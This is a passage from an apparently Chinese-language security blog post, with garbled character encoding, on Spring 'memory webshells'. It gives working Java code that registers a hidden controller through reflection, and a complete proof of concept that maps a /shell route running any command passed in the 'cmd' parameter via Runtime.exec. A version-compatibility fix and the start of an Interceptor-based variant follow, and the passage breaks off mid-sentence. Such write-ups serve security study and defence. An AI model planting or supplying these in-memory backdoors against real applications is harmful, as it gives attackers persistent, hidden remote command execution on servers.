class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>r.registerMapping(info, Class.forName(<span class="hljs-string">&quot;æ¶æ„Controller&quot;</span>).newInstance(), method);<br></code></pre></td></tr></table></figure><h5 id="registerHandler"><a href="#registerHandler" class="headerlink" title="registerHandler"></a>registerHandler</h5><p>å‚è€ƒä¸Šé¢çš„ <code>HandlerMapping</code> æ¥å£ç»§æ‰¿å…³ç³»å›¾ï¼Œé’ˆå¯¹ä½¿ç”¨ <code>DefaultAnnotationHandlerMapping</code> æ˜ å°„å™¨çš„åº”ç”¨ï¼Œå¯ä»¥æ‰¾åˆ°å®ƒç»§æ‰¿çš„é¡¶å±‚ç±»<code>org.springframework.web.servlet.handler.AbstractUrlHandlerMapping</code></p><p>åœ¨å…¶<code>registerHandler()</code>æ–¹æ³•ä¸­</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518808.png" alt="img"></p><p> è¯¥æ–¹æ³•æ¥å— <code>urlPath</code>å‚æ•°å’Œ <code>handler</code>å‚æ•°ï¼Œå¯ä»¥åœ¨ <code>this.getApplicationContext()</code> è·å¾—çš„ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­å¯»æ‰¾åå­—ä¸º <code>handler</code> å‚æ•°å€¼çš„ <code>bean</code>, å°† url å’Œ controller å®ä¾‹ bean æ³¨å†Œåˆ° <code>handlerMap</code> ä¸­  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 1. åœ¨å½“å‰ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­æ³¨å†Œä¸€ä¸ªåä¸º dynamicController çš„ Webshell controller å®ä¾‹ bean</span><br>context.getBeanFactory().registerSingleton(<span class="hljs-string">&quot;dynamicController&quot;</span>, Class.forName(<span class="hljs-string">&quot;me.landgrey.SSOLogin&quot;</span>).newInstance());<br><span class="hljs-comment">// 2. ä»å½“å‰ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­è·å¾— DefaultAnnotationHandlerMapping çš„å®ä¾‹ bean</span><br>org.springframework.web.servlet.mvc.annotation.<span class="hljs-type">DefaultAnnotationHandlerMapping</span>  <span class="hljs-variable">dh</span> <span class="hljs-operator">=</span> context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping.class);<br><span class="hljs-comment">// 3. åå°„è·å¾— registerHandler Method</span><br>java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">m1</span> <span class="hljs-operator">=</span> org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod(<span class="hljs-string">&quot;registerHandler&quot;</span>, String.class, Object.class);<br>m1.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">// 4. å°† dynamicController å’Œ URL æ³¨å†Œåˆ° handlerMap ä¸­</span><br>m1.invoke(dh, <span class="hljs-string">&quot;/favicon&quot;</span>, <span class="hljs-string">&quot;dynamicController&quot;</span>);<br></code></pre></td></tr></table></figure><h5 id="detectHandlerMethods"><a href="#detectHandlerMethods" class="headerlink" title="detectHandlerMethods"></a>detectHandlerMethods</h5><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518516.png" alt="img"></p><p> è¯¥æ–¹æ³•ä»…æ¥å—<code>handler</code>å‚æ•°ï¼ŒåŒæ ·å¯ä»¥åœ¨ <code>this.getApplicationContext()</code> è·å¾—çš„ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­å¯»æ‰¾åå­—ä¸º <code>handler</code> å‚æ•°å€¼çš„ <code>bean</code>, å¹¶æ³¨å†Œ <code>controller</code> çš„å®ä¾‹ <code>bean</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">context.getBeanFactory().registerSingleton(<span class="hljs-string">&quot;dynamicController&quot;</span>, Class.forName(<span class="hljs-string">&quot;æ¶æ„Controller&quot;</span>).newInstance());<br>org.springframework.web.servlet.mvc.method.annotation.<span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">requestMappingHandlerMapping</span> <span class="hljs-operator">=</span> context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class);<br>java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">m1</span> <span class="hljs-operator">=</span> org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod(<span class="hljs-string">&quot;detectHandlerMethods&quot;</span>, Object.class);<br>m1.setAccessible(<span class="hljs-literal">true</span>);<br>m1.invoke(requestMappingHandlerMapping, <span class="hljs-string">&quot;dynamicController&quot;</span>);<br></code></pre></td></tr></table></figure><h4 id="1-3-3-å®ç°æ¶æ„-Controller"><a href="#1-3-3-å®ç°æ¶æ„-Controller" class="headerlink" title="1.3.3 å®ç°æ¶æ„ Controller"></a>1.3.3 å®ç°æ¶æ„ Controller</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.springmem.demos.web;<br><br><br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ControllerShell</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ControllerShell</span><span class="hljs-params">()</span> &#123;&#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shell</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();<br>        Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-3-4-å®Œæ•´-POC"><a href="#1-3-4-å®Œæ•´-POC" class="headerlink" title="1.3.4 å®Œæ•´ POC"></a>1.3.4 å®Œæ•´ POC</h4><p>POC å¹¶ä¸å”¯ä¸€ï¼Œæƒ³è¦å¤ç°æˆåŠŸå–å†³äºè‡ªå·±çš„<strong>è¿è¡Œç¯å¢ƒ</strong>ï¼Œæ¯”å¦‚ spring boot ç‰ˆæœ¬é—®é¢˜ç­‰ï¼Œ<strong>å…·ä½“é—®é¢˜å…·ä½“åˆ†æï¼</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.springmem.demos.web;<br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">shell_controller</span> &#123;<br><br>    <span class="hljs-comment">//    @ResponseBody</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/control&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Spring_Controller</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException &#123;<br><br>        <span class="hljs-comment">//è·å–å½“å‰ä¸Šä¸‹æ–‡ç¯å¢ƒ</span><br>        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br><br>        <span class="hljs-comment">//æ‰‹åŠ¨æ³¨å†ŒController</span><br>        <span class="hljs-comment">// 1. ä»å½“å‰ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­è·å¾— RequestMappingHandlerMapping çš„å®ä¾‹ bean</span><br>        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br>        <span class="hljs-comment">// 2. é€šè¿‡åå°„è·å¾—è‡ªå®šä¹‰ controller ä¸­å”¯ä¸€çš„ Method å¯¹è±¡</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> Controller_Shell.class.getDeclaredMethod(<span class="hljs-string">&quot;shell&quot;</span>);<br>        <span class="hljs-comment">// 3. å®šä¹‰è®¿é—® controller çš„ URL åœ°å€</span><br>        <span class="hljs-type">PatternsRequestCondition</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PatternsRequestCondition</span>(<span class="hljs-string">&quot;/shell&quot;</span>);<br>        <span class="hljs-comment">// 4. å®šä¹‰å…è®¸è®¿é—® controller çš„ HTTP æ–¹æ³•ï¼ˆGET/POSTï¼‰</span><br>        <span class="hljs-type">RequestMethodsRequestCondition</span> <span class="hljs-variable">ms</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMethodsRequestCondition</span>();<br>        <span class="hljs-comment">// 5. åœ¨å†…å­˜ä¸­åŠ¨æ€æ³¨å†Œ controller</span><br>        <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingInfo</span>(url, ms, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        r.registerMapping(info, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Controller_Shell</span>(), method);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Controller_Shell</span>&#123;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Controller_Shell</span><span class="hljs-params">()</span>&#123;&#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shell</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><br>            <span class="hljs-comment">//è·å–request</span><br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();<br>            Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>));<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>å…ˆè®¿é—® &#x2F;control è¿›è¡Œ controller æ³¨å†Œï¼Œç„¶åè®¿é—® controller æ˜ å°„è·¯å¾„ &#x2F;shellï¼ŒåŠ ä¸Šå‚æ•°å°±å¯ä»¥å®ç° RCE</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518492.png" alt="img"><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518947.png" alt="img"></p><h4 id="è®°å½•é—®é¢˜ï¼š"><a href="#è®°å½•é—®é¢˜ï¼š" class="headerlink" title="è®°å½•é—®é¢˜ï¼š"></a>è®°å½•é—®é¢˜ï¼š</h4><p>ç¯å¢ƒï¼š</p><p>Spring Boot    v2.6.13</p><p>Spring Framework v5.3.23</p><p>Tomcat 9.0.68</p><p>JDK 1.8.0_65</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518183.png" alt="img"></p><p> <strong>- æ ¸å¿ƒé”™è¯¯ï¼š</strong>ï¼ˆå€Ÿç”¨ AI è§£å†³ï¼‰</p><p><strong>java.lang.IllegalArgumentException: Expected lookupPath in request attribute â€œorg.springframework.web.util.UrlPathHelper.PATHâ€.</strong></p><p>â€‹at org.springframework.util.Assert.notNull(Assert.java:201) ~[spring-core-5.3.23.jar:5.3.23]</p><p>â€‹at org.springframework.web.util.UrlPathHelper.getResolvedLookupPath(UrlPathHelper.java:213) ~[spring-web-5.3.23.jar:5.3.23]</p><p>Spring MVC åœ¨åŒ¹é…è¯·æ±‚è·¯å¾„æ—¶ï¼Œä» <code>request</code> ä¸­æ²¡æœ‰æ‰¾åˆ°åä¸º <code>&quot;org.springframework.web.util.UrlPathHelper.PATH&quot;</code> çš„å±æ€§ã€‚</p><p>è¿™æ˜¯ <strong>Spring 5.3.x</strong> ä¸ <strong>Tomcat 9 &#x2F; Servlet 4</strong> ä¹‹é—´åœ¨è¯·æ±‚è·¯å¾„è§£ææœºåˆ¶ä¸Šçš„ä¸€ä¸ªå…¼å®¹æ€§é—®é¢˜ã€‚</p><p><strong>å‡ºç°åŸå› ï¼š</strong></p><h3 id="Spring-Boot-ç‰ˆæœ¬é—®é¢˜"><a href="#Spring-Boot-ç‰ˆæœ¬é—®é¢˜" class="headerlink" title="Spring Boot ç‰ˆæœ¬é—®é¢˜"></a>Spring Boot ç‰ˆæœ¬é—®é¢˜</h3><p>ä½¿ç”¨çš„æ˜¯ï¼š</p><p>Spring Boot 2.6.13</p><p>Spring Framework 5.3.23</p><p>Tomcat 9.0.68</p><p>è¿™ä¸€ä»£ä¸­ï¼ŒSpring MVC çš„è·¯å¾„è§£æé»˜è®¤åˆ‡æ¢åˆ°äº† <strong>PathPatternParser</strong>ï¼Œè€Œéƒ¨åˆ†ç»„ä»¶ä»ç„¶ä¾èµ–æ—§çš„ <code>UrlPathHelper</code>ã€‚</p><p>å¦‚æœä½ é¡¹ç›®ä¸­æ··ç”¨äº†æ—§å¼çš„ <code>@RequestMappingHandlerMapping</code> æˆ–è‡ªå®šä¹‰ <code>HandlerMapping</code>ï¼Œä¹Ÿå¯èƒ½è§¦å‘è¿™ä¸ªé—®é¢˜ã€‚</p><h3 id="Spring-é…ç½®ä¸å…¼å®¹ï¼ˆå¯èƒ½åŠ äº†æŸäº›é…ç½®ç±»ï¼‰"><a href="#Spring-é…ç½®ä¸å…¼å®¹ï¼ˆå¯èƒ½åŠ äº†æŸäº›é…ç½®ç±»ï¼‰" class="headerlink" title="Spring é…ç½®ä¸å…¼å®¹ï¼ˆå¯èƒ½åŠ äº†æŸäº›é…ç½®ç±»ï¼‰"></a>Spring é…ç½®ä¸å…¼å®¹ï¼ˆå¯èƒ½åŠ äº†æŸäº›é…ç½®ç±»ï¼‰</h3><p>ä» Spring Boot 2.6 å¼€å§‹ï¼š</p><ul><li>é»˜è®¤è·¯å¾„åŒ¹é…ç­–ç•¥ä» <code>AntPathMatcher</code> æ”¹æˆäº† <code>PathPatternParser</code>ï¼›</li><li>æŸäº›æ—§ä»£ç ï¼ˆæˆ–è‡ªå®šä¹‰ Controller æ³¨å†Œé€»è¾‘ï¼‰æ²¡é€‚é…è¿™ä¸ªæ–°è§„åˆ™ã€‚</li></ul><p><strong>è§£å†³æ–¹æ³•ï¼š</strong></p><p>åœ¨ <code>application.properties</code> æˆ– <code>application.yml</code> åŠ ä¸Šï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">spring.mvc.pathmatch.matching-strategy=ant_path_matcher<br></code></pre></td></tr></table></figure><p>æ„æ€ï¼šå¼ºåˆ¶ä½¿ç”¨æ—§ç‰ˆçš„è·¯å¾„è§£ææœºåˆ¶ï¼ˆä¸ Spring 2.5 ä»¥å‰ç‰ˆæœ¬å…¼å®¹ï¼‰ã€‚</p><p>é€‚ç”¨äºç›®å‰ä½¿ç”¨çš„ Spring Boot 2.6.xã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081520466.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518085.png" alt="img"></p><h2 id="2ã€Interceptor-å†…å­˜é©¬"><a href="#2ã€Interceptor-å†…å­˜é©¬" class="headerlink" title="2ã€Interceptor å†…å­˜é©¬"></a>2ã€Interceptor å†…å­˜é©¬</h2><h3 id="ä»€ä¹ˆæ˜¯Interceptor"><a href="#ä»€ä¹ˆæ˜¯Interceptor" class="headerlink" title="ä»€ä¹ˆæ˜¯Interceptor"></a>ä»€ä¹ˆæ˜¯Interceptor</h3><p>Spring MVC çš„æ‹¦æˆªå™¨ï¼ˆInterceptorï¼‰ä¸ Java Servlet çš„è¿‡æ»¤å™¨ï¼ˆFilterï¼‰ç±»ä¼¼ï¼Œå®ƒä¸»è¦ç”¨äºæ‹¦æˆªç”¨æˆ·çš„è¯·æ±‚å¹¶åšç›¸åº”çš„å¤„ç†ï¼Œé€šå¸¸åº”ç”¨åœ¨æƒé™éªŒè¯ã€è®°å½•è¯·æ±‚ä¿¡æ¯çš„æ—¥å¿—ã€åˆ¤æ–­ç”¨æˆ·æ˜¯å¦ç™»å½•ç­‰åŠŸèƒ½ä¸Šã€‚</p><p>åœ¨ Spring MVC æ¡†æ¶ä¸­å®šä¹‰ä¸€ä¸ªæ‹¦æˆªå™¨éœ€è¦å¯¹æ‹¦æˆªå™¨è¿›è¡Œå®šä¹‰å’Œé…ç½®ï¼Œä¸»è¦æœ‰ä»¥ä¸‹ 2 ç§æ–¹å¼ã€‚</p><ul><li>é€šè¿‡å®ç° HandlerInterceptor æ¥å£æˆ–ç»§æ‰¿ HandlerInterceptor æ¥å£çš„å®ç°ç±»ï¼ˆä¾‹å¦‚ HandlerInterceptorAdapterï¼‰æ¥å®šä¹‰</li><li>é€šè¿‡å®ç° WebRequestInterceptor æ¥å£æˆ–ç»§æ‰¿ WebRequestInterceptor æ¥å£çš„å®ç°ç±»æ¥å®šä¹‰</li></ul><p><strong>Interceptorå’ŒTomcatå’ŒFilterè¿‡æ»¤å™¨å¾ˆç±»ä¼¼ã€‚</strong></p><p>åŒºåˆ«å¦‚ä¸‹ï¼š</p><ol><li>InterceptoråŸºäºåå°„ï¼ŒFilteråŸºäºå‡½æ•°å›è°ƒ</li><li>Interceptorä¸ä¾èµ–servletå®¹å™¨</li><li>Interceptoråªèƒ½å¯¹actionè¯·æ±‚æœ‰ç”¨</li><li>Interceptorå¯ä»¥è®¿é—®actionä¸Šä¸‹æ–‡ï¼Œæ ˆé‡Œçš„å¯¹è±¡ã€‚Filterä¸èƒ½</li><li>actionç”Ÿå‘½å‘¨æœŸä¸­ï¼ŒInterceptorå¯ä»¥è¢«å¤šæ¬¡è°ƒç”¨ï¼ŒFilteråªåœ¨å®¹å™¨åˆå§‹åŒ–æ—¶è°ƒç”¨ä¸€æ¬¡</li><li>Interceptorå¯ä»¥è·å–IOCå®¹å™¨ä¸­çš„beanï¼ŒFilterä¸è¡Œ</li></ol><p>ç”±ä»¥ä¸ŠåŒºåˆ«ï¼ŒInterceptorçš„åº”ç”¨å’Œè¿‡æ»¤å™¨ä¹Ÿå°±ä¸åŒï¼ŒInterceptorç”¨æ¥åšæ—¥å¿—è®°å½•ï¼Œè¿‡æ»¤å™¨ç”¨æ¥è¿‡æ»¤éæ³•æ“ä½œ</p><h3 id="2-1-Interceptor-åˆ›å»º"><a href="#2-1-Interceptor-åˆ›å»º" class="headerlink" title="2.1 Interceptor åˆ›å»º"></a>2.1 Interceptor åˆ›å»º</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.springmem.demos.interceptor;<br><br><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoginInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> String.valueOf(request.getRequestURL());<br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br><br>        <span class="hljs-keyword">if</span>(url.indexOf(<span class="hljs-string">&quot;/login&quot;</span>)&gt;= <span class="hljs-number">0</span> )&#123;<br>            writer.write(<span class="hljs-string">&quot;LoginIn&quot;</span>);<br>            writer.flush();<br>            writer.close();<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        writer.write(<span class="hljs-string">&quot;LoginInFirst&quot;</span>);<br>        writer.flush();<br>        writer.close();<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.springmem.demos.controller;<br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoginController</span> &#123;<br>    <span class="hljs-meta">@GetMapping(&quot;/login&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">login</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Login Page&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/data&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">data</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Protected Data&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.springmem.demos.config;<br><br><span class="hljs-keyword">import</span> com.src.springmem.demos.interceptor.LoginInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.config.annotation.InterceptorRegistry;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;<br><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">WebMvcConfigurer</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addInterceptors</span><span class="hljs-params">(InterceptorRegistry registry)</span> &#123;<br>        registry.addInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LoginInterceptor</span>())<br>                .addPathPatterns(<span class="hljs-string">&quot;/**&quot;</span>)           <span class="hljs-comment">// æ‹¦æˆªæ‰€æœ‰è·¯å¾„</span><br>                .excludePathPatterns(<span class="hljs-string">&quot;/login&quot;</span>);   <span class="hljs-comment">// æ”¾è¡Œç™»å½•æ¥å£</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081520006.png" alt="img"></p><p>è®¿é—®å¯é€šè¡Œçš„è·¯å¾„ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518686.png" alt="img"><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518278.png" alt="img"></p><h3 id="2-2-Interceptor-æµç¨‹åˆ†æ"><a href="#2-2-Interceptor-æµç¨‹åˆ†æ" class="headerlink" title="2.2 Interceptor æµç¨‹åˆ†æ"></a>2.2 Interceptor æµç¨‹åˆ†æ</h3><p>è¿˜æ˜¯åœ¨ DispatcherServlet.doDispatch å¤„ä¸‹æ–­ç‚¹è°ƒè¯•</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518820.png" alt="img"></p><p>æ­¥å…¥ getHandler()</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081521460.png" alt="img"></p><p>ç»§ç»­è·Ÿè¿›ï¼Œæ¥åˆ°ä¸€ä¸ªæ–¹æ³•ï¼šgetHandlerExecutionChain</p><p>è¯¥æ–¹æ³•ä» adaptedInterceptors ä¸­æŠŠç¬¦åˆçš„æ‹¦æˆªå™¨æ·»åŠ åˆ° chain é‡Œï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518126.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518756.png" alt="img"></p><p>æœ€åæŠŠç»“æœè¿”å›åˆ° doDispatch</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081521545.png" alt="img"></p><p>åœ¨ doDispath  ä¸­æ‰§è¡Œ 